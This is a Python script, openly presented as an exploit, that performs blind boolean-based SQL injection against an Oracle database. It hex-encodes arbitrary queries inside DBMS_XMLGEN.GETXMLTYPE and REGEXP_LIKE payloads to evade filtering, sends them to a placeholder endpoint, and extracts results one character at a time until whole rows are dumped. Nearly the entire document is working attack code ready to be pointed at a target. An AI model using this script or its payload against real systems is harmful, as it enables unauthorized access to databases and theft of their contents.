# A little script to exploit a simple SQL injection on a Oracle database using XML funtions to bypass security mechanisms. The retrieved data will be case insensitive!
# Reference: https://mahmoudsec.blogspot.com/2023/02/sql-injection-utilizing-xml-functions.html

import requests


s = "abcdefghijklmnopqrstuvwxyz0123456789_-@$#/." # charlist
more_rows = True
printed_rows = []

user_query = input("Query: ") # example: select user from dual
column_name = user_query.split()[1]
query = user_query

while(more_rows):
  more_rows = False
  restart = True
  res = ''
  res_fixed = ''
  while(restart):
    restart = False
    for i in s:
      fixed_i = i
      if fixed_i == "$":
        fixed_i = "%5c$"
      if fixed_i == "#":
        fixed_i = "%23"
      if fixed_i == ".":
        fixed_i = "%5c."
      payload = f"7338'+and+REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('{query.encode('utf-8').hex()}'))),'%3e{str(res_fixed)}{str(fixed_i)}.?','i')--"
      r= requests.get(f"http://domain.com/query?clave={payload}")
      if "VERIFIED" in r.text:
          res += str(i)
          res_fixed += str(fixed_i)
          print(i, end="", flush=True)
          restart = True
          break
  if res:
    printed_rows.append(res)
    print()
    query = f"SELECT * FROM ({user_query}) WHERE lower({column_name}) not like '{printed_rows[0]}'"
    for printed_row in printed_rows[1:]:
      query = f"{query} and lower({column_name}) not like '{printed_row}'"
    more_rows = True

print()
print("DONE!") 
